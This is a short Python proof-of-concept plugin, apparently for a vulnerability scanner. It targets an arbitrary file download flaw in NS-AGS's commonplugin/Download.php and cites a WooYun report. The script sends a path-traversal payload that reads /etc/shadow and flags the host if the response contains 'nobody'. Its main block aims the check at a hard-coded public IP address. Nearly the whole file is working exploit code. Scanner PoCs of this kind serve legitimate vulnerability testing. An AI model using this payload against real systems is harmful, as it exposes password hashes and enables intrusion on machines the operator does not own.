#!/usr/bin/env python
# -*- coding: utf-8 -*-

"""
_POC Name_  :  NS-AGS /commonplugin-Download.php 任意文件下载漏洞
_References_:  http://wooyun.org/bugs/wooyun-2014-058838
_Author_    :   相守
"""
def assign(service, arg):
    if service == "ng-ags":
        return True, arg

def audit(arg):
    url = arg
    payload='commonplugin/Download.php?licensefile=../../../../../../../../../../etc/shadow'
    code, head, res, errcode, _ = curl.curl(url +payload )
    if code == 200  and "nobody" in res:
            security_hole(url+payload)

if __name__ == '__main__':
    from dummy import *
    audit(assign('ng-ags', 'https://121.28.81.124/')[1])